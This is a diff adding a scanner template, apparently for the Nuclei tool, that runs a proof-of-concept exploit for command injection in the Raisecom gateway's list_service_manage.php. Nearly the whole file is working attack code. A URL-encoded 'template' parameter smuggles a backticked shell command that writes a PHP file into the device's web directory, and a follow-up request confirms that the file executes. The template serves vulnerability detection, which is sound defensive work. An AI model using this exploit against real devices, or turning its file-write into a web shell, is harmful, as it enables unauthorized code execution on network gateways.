@@ -1,0 +1,45 @@
+id: poc-raisecom-gateway-list-service-manage-ci
+info:
+  name: Raisecom Gateway list_service_manage.php Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a command injection vulnerability in Raisecom Multiple-Service Intelligent Gateway through the list_service_manage.php file.
+  tags: command-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: create-php-file
+    method: POST
+    path:
+      - "/vpn/list_service_manage.php?template=%60echo+-e+%27%3C%3Fphp+echo+md5%28{{t1}}%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{t1}}.php%60"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "Nradius_submit=true"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "无标题文档"
+
+  - id: verify-php-file
+    method: GET
+    path:
+      - "/tmp/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
